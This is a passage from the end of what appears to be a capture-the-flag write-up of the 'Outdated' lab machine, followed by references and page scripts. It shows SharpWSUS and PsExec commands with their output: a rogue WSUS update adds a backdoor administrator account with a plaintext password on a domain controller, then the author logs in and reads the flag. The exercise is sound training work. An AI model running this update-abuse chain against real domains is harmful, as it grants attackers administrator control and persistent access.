<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\SharpWSUS<span class="op">.</span><span class="fu">exe</span> create <span class="op">/</span>payload<span class="op">:</span><span class="st">'C:\Windows\Tasks\PsExec64.exe'</span> <span class="op">/</span>args<span class="op">:</span><span class="st">'-accepteula -s -d cmd.exe /c \"net user 0xpthree Password123! /add &amp;&amp; net localgroup Administrators 0xpthree /add &amp;&amp; net localgroup Remote Management Users 0xpthree /add"'</span></span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Action<span class="op">:</span> Create Update</span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Creating patch to use the following<span class="op">:</span></span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Payload<span class="op">:</span> PsExec64<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Payload Path<span class="op">:</span> C<span class="op">:</span>\Windows\Tasks\PsExec64<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Arguments<span class="op">:</span> <span class="op">-</span>accepteula <span class="op">-</span>s <span class="op">-</span>d cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>c <span class="st">"net user 0xpthree Password123! /add &amp;&amp; net localgroup Administrators 0xpthree /add &amp;&amp; net localgroup Remote Management Users 0xpthree /add"</span></span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Arguments <span class="op">(</span>HTML Encoded<span class="op">):</span> <span class="op">-</span>accepteula <span class="op">-</span>s <span class="op">-</span>d cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>c <span class="op">&amp;</span>amp<span class="op">;</span>quot<span class="op">;</span>net user 0xpthree Password123<span class="op">!</span> <span class="op">/</span>add <span class="op">&amp;</span>amp<span class="op">;</span>amp<span class="op">;&amp;</span>amp<span class="op">;</span>amp<span class="op">;</span> net localgroup Administrators 0xpthree <span class="op">/</span>add <span class="op">&amp;</span>amp<span class="op">;</span>amp<span class="op">;&amp;</span>amp<span class="op">;</span>amp<span class="op">;</span> net localgroup Remote Management Users 0xpthree <span class="op">/</span>add<span class="op">&amp;</span>amp<span class="op">;</span>quot<span class="op">;</span></span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="co">################# WSUS Server Enumeration via SQL ##################</span></span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a>ServerName<span class="op">,</span> WSUSPortNumber<span class="op">,</span> WSUSContentLocation</span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a><span class="op">-----------------------------------------------</span></span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>DC<span class="op">,</span> <span class="dv">8530</span><span class="op">,</span> c<span class="op">:</span>\WSUS\WsusContent</span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a>ImportUpdate</span>
<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a>Update Revision ID<span class="op">:</span> <span class="dv">54</span></span>
<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a><span class="dt">PrepareXMLtoClient</span></span>
<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a>InjectURL2Download</span>
<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a>DeploymentRevision</span>
<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a>PrepareBundle</span>
<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a>PrepareBundle Revision ID<span class="op">:</span> <span class="dv">55</span></span>
<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a><span class="dt">PrepareXMLBundletoClient</span></span>
<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a>DeploymentRevision</span>
<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Update created <span class="op">-</span> When ready to deploy use the following command<span class="op">:</span></span>
<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> SharpWSUS<span class="op">.</span><span class="fu">exe</span> approve <span class="op">/</span>updateid<span class="op">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op">/</span>computername<span class="op">:</span>Target<span class="op">.</span><span class="fu">FQDN</span> <span class="op">/</span>groupname<span class="op">:</span><span class="st">"Group Name"</span></span>
<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> To check on the update status use the following command<span class="op">:</span></span>
<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> SharpWSUS<span class="op">.</span><span class="fu">exe</span> check <span class="op">/</span>updateid<span class="op">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op">/</span>computername<span class="op">:</span>Target<span class="op">.</span><span class="fu">FQDN</span></span>
<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> To delete the update use the following command<span class="op">:</span></span>
<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> SharpWSUS<span class="op">.</span><span class="fu">exe</span> delete <span class="op">/</span>updateid<span class="op">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op">/</span>computername<span class="op">:</span>Target<span class="op">.</span><span class="fu">FQDN</span> <span class="op">/</span>groupname<span class="op">:</span><span class="st">"Group Name"</span></span>
<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Create complete</span>
<span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">./</span>SharpWSUS<span class="op">.</span><span class="fu">exe</span> approve <span class="op">/</span>updateid<span class="op">:</span>073f32f7-8d0d-431c-9f43-7758157fe39b <span class="op">/</span>computername<span class="op">:</span>dc<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span> <span class="op">/</span>groupname<span class="op">:</span><span class="st">"Administrators"</span></span>
<span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Action<span class="op">:</span> Approve Update</span>
<span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a>Targeting dc<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span></span>
<span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a>TargetComputer<span class="op">,</span> ComputerID<span class="op">,</span> TargetID</span>
<span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a><span class="op">------------------------------------</span></span>
<span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a>dc<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span><span class="op">,</span> bd6d57d0-5e6f-4e74-a789-35c8955299e1<span class="op">,</span> <span class="dv">1</span></span>
<span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a><span class="dt">Group</span> Exists <span class="op">=</span> False</span>
<span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a><span class="fu">Group</span> Created<span class="op">:</span> Administrators</span>
<span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a>Added Computer To <span class="fu">Group</span></span>
<span id="cb22-51"><a href="#cb22-51" aria-hidden="true" tabindex="-1"></a>Approved Update</span>
<span id="cb22-52"><a href="#cb22-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-53"><a href="#cb22-53" aria-hidden="true" tabindex="-1"></a><span class="op">[*]</span> Approve complete</span>
<span id="cb22-54"><a href="#cb22-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-55"><a href="#cb22-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-56"><a href="#cb22-56" aria-hidden="true" tabindex="-1"></a>➜  outdated evil-winrm <span class="op">-</span>i outdated<span class="op">.</span><span class="fu">htb</span> <span class="op">-</span>u 0xpthree <span class="op">-</span>p Password123<span class="op">!</span></span>
<span id="cb22-57"><a href="#cb22-57" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\0xpthree\Documents<span class="op">&gt;</span> whoami</span>
<span id="cb22-58"><a href="#cb22-58" aria-hidden="true" tabindex="-1"></a>outdated\0xpthree</span>
<span id="cb22-59"><a href="#cb22-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-60"><a href="#cb22-60" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\0xpthree\Documents<span class="op">&gt;</span> whoami <span class="op">/</span>groups</span>
<span id="cb22-61"><a href="#cb22-61" aria-hidden="true" tabindex="-1"></a><span class="fu">Group</span> Name                                 <span class="fu">Type</span>             SID          Attributes</span>
<span id="cb22-62"><a href="#cb22-62" aria-hidden="true" tabindex="-1"></a><span class="op">==========================================</span> <span class="op">================</span> <span class="op">============</span> <span class="op">===============================================================</span></span>
<span id="cb22-63"><a href="#cb22-63" aria-hidden="true" tabindex="-1"></a>Everyone                                   Well-known <span class="fu">group</span> S-1-1-0      Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-64"><a href="#cb22-64" aria-hidden="true" tabindex="-1"></a>BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span><span class="op">,</span> <span class="fu">Group</span> owner</span>
<span id="cb22-65"><a href="#cb22-65" aria-hidden="true" tabindex="-1"></a>BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-66"><a href="#cb22-66" aria-hidden="true" tabindex="-1"></a>BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-67"><a href="#cb22-67" aria-hidden="true" tabindex="-1"></a>BUILTIN\Pre-Windows <span class="dv">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-68"><a href="#cb22-68" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\NETWORK                       Well-known <span class="fu">group</span> S-1-5-2      Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-69"><a href="#cb22-69" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\Authenticated Users           Well-known <span class="fu">group</span> S-1-5-11     Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-70"><a href="#cb22-70" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\This Organization             Well-known <span class="fu">group</span> S-1-5-15     Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-71"><a href="#cb22-71" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\NTLM Authentication           Well-known <span class="fu">group</span> S-1-5-64-10  Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb22-72"><a href="#cb22-72" aria-hidden="true" tabindex="-1"></a>Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span>
<span id="cb22-73"><a href="#cb22-73" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-74"><a href="#cb22-74" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\Administrator\Desktop<span class="op">&gt;</span> <span class="fu">type</span> root<span class="op">.</span><span class="fu">txt</span></span>
<span id="cb22-75"><a href="#cb22-75" aria-hidden="true" tabindex="-1"></a>a6c2f6e1b2d05b537f337ba2f8209413</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="references" class="level2">
<h2 class="anchored" data-anchor-id="references">References</h2>
<ul>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" class="uri">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials</a></li>
<li><a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/" class="uri">https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/</a></li>
<li><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/" class="uri">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment" class="uri">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment</a></li>
</ul>


</section>
</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
  window.document.addEventListener("DOMContentLoaded", function (event) {
    const icon = "";
    const anchorJS = new window.AnchorJS();
    anchorJS.options = {
      placement: 'right',
      icon: icon
    };
    anchorJS.add('.anchored');
    const isCodeAnnotation = (el) => {
      for (const clz of el.classList) {
        if (clz.startsWith('code-annotation-')) {                     
          return true;
        }
      }
      return false;
    }
    const onCopySuccess = function(e) {
      // button target
      const button = e.trigger;
      // don't keep focus
      button.blur();
      // flash "checked"
      button.classList.add('code-copy-button-checked');
      var currentTitle = button.getAttribute("title");
      button.setAttribute("title", "Copied!");
      let tooltip;
      if (window.bootstrap) {
        button.setAttribute("data-bs-toggle", "tooltip");
        button.setAttribute("data-bs-placement", "left");
        button.setAttribute("data-bs-title", "Copied!");
        tooltip = new bootstrap.Tooltip(button, 
          { trigger: "manual", 
            customClass: "code-copy-button-tooltip",
            offset: [0, -8]});
        tooltip.show();    
      }
      setTimeout(function() {
        if (tooltip) {
          tooltip.hide();
          button.removeAttribute("data-bs-title");
          button.removeAttribute("data-bs-toggle");
          button.removeAttribute("data-bs-placement");
        }
        button.setAttribute("title", currentTitle);
        button.classList.remove('code-copy-button-checked');
      }, 1000);
      // clear code selection
      e.clearSelection();
    }
    const getTextToCopy = function(trigger) {
        const codeEl = trigger.previousElementSibling.cloneNode(true);
        for (const childEl of codeEl.children) {
          if (isCodeAnnotation(childEl)) {
            childEl.remove();
          }
        }
        return codeEl.innerText;
    }
    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
      text: getTextToCopy
    });
    clipboard.on('success', onCopySuccess);
    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
        text: getTextToCopy,
        container: window.document.getElementById('quarto-embedded-source-code-modal')
      });
      clipboardModal.on('success', onCopySuccess);
    }
      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
      var mailtoRegex = new RegExp(/^mailto:/);
        var filterRegex = new RegExp("https:\/\/exploit\.se");
      var isInternal = (href) => {
          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
      }
      // Inspect non-navigation links and adorn them if external
     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
      for (var i=0; i<links.length; i++) {
        const link = links[i];
        if (!isInternal(link.href)) {
          // undo the damage that might have been done by quarto-nav.js in the case of
          // links that we want to consider external
          if (link.dataset.originalHref !== undefined) {
            link.href = link.dataset.originalHref;
          }
        }
      }
    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
      const config = {
        allowHTML: true,
        maxWidth: 500,
        delay: 100,
        arrow: false,
        appendTo: function(el) {
            return el.parentElement;
        },
        interactive: true,
        interactiveBorder: 10,
        theme: 'quarto',
        placement: 'bottom-start',
      };
      if (contentFn) {
        config.content = contentFn;
      }
      if (onTriggerFn) {
        config.onTrigger = onTriggerFn;
      }
      if (onUntriggerFn) {
        config.onUntrigger = onUntriggerFn;
      }
      window.tippy(el, config); 
    }
    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
    for (var i=0; i<noterefs.length; i++) {
      const ref = noterefs[i];
      tippyHover(ref, function() {
        // use id or data attribute instead here
        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
        try { href = new URL(href).hash; } catch {}
        const id = href.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note) {
          return note.innerHTML;
        } else {
          return "";
        }
      });
    }
    const xrefs = window.document.querySelectorAll('a.quarto-xref');
    const processXRef = (id, note) => {
      // Strip column container classes
      const stripColumnClz = (el) => {
        el.classList.remove("page-full", "page-columns");
        if (el.children) {
          for (const child of el.children) {
            stripColumnClz(child);
          }
        }
      }
      stripColumnClz(note)
      if (id === null || id.startsWith('sec-')) {
        // Special case sections, only their first couple elements
        const container = document.createElement("div");
        if (note.children && note.children.length > 2) {
          container.appendChild(note.children[0].cloneNode(true));
          for (let i = 1; i < note.children.length; i++) {
            const child = note.children[i];
            if (child.tagName === "P" && child.innerText === "") {
              continue;
            } else {
              container.appendChild(child.cloneNode(true));
              break;
            }
          }
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(container);
          }
          return container.innerHTML
        } else {
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(note);
          }
          return note.innerHTML;
        }
      } else {
        // Remove any anchor links if they are present
        const anchorLink = note.querySelector('a.anchorjs-link');
        if (anchorLink) {
          anchorLink.remove();
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        if (note.classList.contains("callout")) {
          return note.outerHTML;
        } else {
          return note.innerHTML;
        }
      }
    }
    for (var i=0; i<xrefs.length; i++) {
      const xref = xrefs[i];
      tippyHover(xref, undefined, function(instance) {
        instance.disable();
        let url = xref.getAttribute('href');
        let hash = undefined; 
        if (url.startsWith('#')) {
          hash = url;
        } else {
          try { hash = new URL(url).hash; } catch {}
        }
        if (hash) {
          const id = hash.replace(/^#\/?/, "");
          const note = window.document.getElementById(id);
          if (note !== null) {
            try {
              const html = processXRef(id, note.cloneNode(true));
              instance.setContent(html);
            } finally {
              instance.enable();
              instance.show();
            }
          } else {
            // See if we can fetch this
            fetch(url.split('#')[0])
            .then(res => res.text())
            .then(html => {
              const parser = new DOMParser();
              const htmlDoc = parser.parseFromString(html, "text/html");
              const note = htmlDoc.getElementById(id);
              if (note !== null) {
                const html = processXRef(id, note);
                instance.setContent(html);
              } 
            }).finally(() => {
              instance.enable();
              instance.show();
            });
          }
        } else {
          // See if we can fetch a full url (with no hash to target)
          // This is a special case and we should probably do some content thinning / targeting
          fetch(url)
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.querySelector('main.content');
            if (note !== null) {
              // This should only happen for chapter cross references
              // (since there is no id in the URL)
              // remove the first header
              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
                note.children[0].remove();
              }
              const html = processXRef(null, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      }, function(instance) {
      });
    }
        let selectedAnnoteEl;
        const selectorForAnnotation = ( cell, annotation) => {
          let cellAttr = 'data-code-cell="' + cell + '"';
          let lineAttr = 'data-code-annotation="' +  annotation + '"';
          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
          return selector;
        }
        const selectCodeLines = (annoteEl) => {
          const doc = window.document;
          const targetCell = annoteEl.getAttribute("data-target-cell");
          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
          const lineIds = lines.map((line) => {
            return targetCell + "-" + line;
          })
          let top = null;
          let height = null;
          let parent = null;
          if (lineIds.length > 0) {
              //compute the position of the single el (top and bottom and make a div)
              const el = window.document.getElementById(lineIds[0]);
              top = el.offsetTop;
              height = el.offsetHeight;
              parent = el.parentElement.parentElement;
            if (lineIds.length > 1) {
              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
              height = bottom - top;
            }
            if (top !== null && height !== null && parent !== null) {
              // cook up a div (if necessary) and position it 
              let div = window.document.getElementById("code-annotation-line-highlight");
              if (div === null) {
                div = window.document.createElement("div");
                div.setAttribute("id", "code-annotation-line-highlight");
                div.style.position = 'absolute';
                parent.appendChild(div);
              }
              div.style.top = top - 2 + "px";
              div.style.height = height + 4 + "px";
              div.style.left = 0;
              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
              if (gutterDiv === null) {
                gutterDiv = window.document.createElement("div");
                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
                gutterDiv.style.position = 'absolute';
                const codeCell = window.document.getElementById(targetCell);
                const gutter = codeCell.querySelector('.code-annotation-gutter');
                gutter.appendChild(gutterDiv);
              }
              gutterDiv.style.top = top - 2 + "px";
              gutterDiv.style.height = height + 4 + "px";
            }
            selectedAnnoteEl = annoteEl;
          }
        };
        const unselectCodeLines = () => {
          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
          elementsIds.forEach((elId) => {
            const div = window.document.getElementById(elId);
            if (div) {
              div.remove();
            }
          });
          selectedAnnoteEl = undefined;
        };
          // Handle positioning of the toggle
      window.addEventListener(
        "resize",
        throttle(() => {
          elRect = undefined;
          if (selectedAnnoteEl) {
            selectCodeLines(selectedAnnoteEl);
          }
        }, 10)
      );
      function throttle(fn, ms) {
      let throttle = false;
      let timer;
        return (...args) => {
          if(!throttle) { // first call gets through
              fn.apply(this, args);
              throttle = true;
          } else { // all the others get throttled
              if(timer) clearTimeout(timer); // cancel #2
              timer = setTimeout(() => {
                fn.apply(this, args);
                timer = throttle = false;
              }, ms);
          }
        };
      }
        // Attach click handler to the DT
        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
        for (const annoteDlNode of annoteDls) {
          annoteDlNode.addEventListener('click', (event) => {
            const clickedEl = event.target;
            if (clickedEl !== selectedAnnoteEl) {
              unselectCodeLines();
              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
              if (activeEl) {
                activeEl.classList.remove('code-annotation-active');
              }
              selectCodeLines(clickedEl);
              clickedEl.classList.add('code-annotation-active');
            } else {
              // Unselect the line
              unselectCodeLines();
              clickedEl.classList.remove('code-annotation-active');
            }
          });
        }
    const findCites = (el) => {
      const parentEl = el.parentElement;
      if (parentEl) {
        const cites = parentEl.dataset.cites;
        if (cites) {
          return {
            el,
            cites: cites.split(' ')
          };
        } else {
          return findCites(el.parentElement)
        }
      } else {
        return undefined;
      }
    };
    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
    for (var i=0; i<bibliorefs.length; i++) {
      const ref = bibliorefs[i];
      const citeInfo = findCites(ref);
      if (citeInfo) {
        tippyHover(citeInfo.el, function() {
          var popup = window.document.createElement('div');
          citeInfo.cites.forEach(function(cite) {
            var citeDiv = window.document.createElement('div');
            citeDiv.classList.add('hanging-indent');
            citeDiv.classList.add('csl-entry');
            var biblioDiv = window.document.getElementById('ref-' + cite);
            if (biblioDiv) {
              citeDiv.innerHTML = biblioDiv.innerHTML;
            }
            popup.appendChild(citeDiv);
          });
          return popup.innerHTML;
        });
      }
    }
  });
  </script>
</div> <!-- /content -->
<footer class="footer">
  <div class="nav-footer">
    <div class="nav-footer-left">
      &nbsp;
    </div>   
    <div class="nav-footer-center">
      <ul class="footer-items list-unstyled">
    <li class="nav-item">
 © 2025 0xPThree - All Rights Reserved.
  </li>  
</ul>
    </div>
    <div class="nav-footer-right">
      <ul class="footer-items list-unstyled">
    <li class="nav-item compact">
    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
      <i class="bi bi-signal" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/0xpthree">
      <i class="bi bi-github" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="../../index.xml">
      <i class="bi bi-rss" role="img">
</i> 
    </a>
  </li>  
</ul>
    </div>
  </div>
</footer>




</body></html>